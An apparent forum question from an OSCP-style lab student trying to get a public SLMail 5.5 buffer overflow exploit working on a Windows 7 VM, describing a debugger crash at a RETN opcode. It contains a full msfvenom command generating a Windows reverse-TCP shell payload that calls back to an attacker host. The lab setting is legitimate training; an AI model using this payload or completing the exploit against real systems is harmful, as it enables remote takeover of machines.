    "content": "I am trying to make this exploit work and having some difficulty.\nSo I skipped to a 'fixed' version of it from here and the only thing I changed was the shell code:\nhttps://github.com/cokebottle/oscp-tools/blob/master/646-fixed.c\nThe program terminates showing error code In Immunity Debugger: <pre><code>BB010002</code></pre>. Even Google doesn't know what this error means. The last command causing program termination is <pre><code>C3</code></pre>, or opcode <pre><code>RETN</code></pre>, so it must have something to do with the stack. This op, that is causing the crash is part of my shell code, which I have generated as follows:\n<pre><code>msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp LHOST=<PWK VM IP> LPORT=443 -b '\\x00\\x0a\\x0d' -f c \n</code></pre>\nThe SLMail is a default setup of 5.5 on a 32-bit windows 7 VM. I've been stuck here for over a week, so please do help as much as possible.\n",
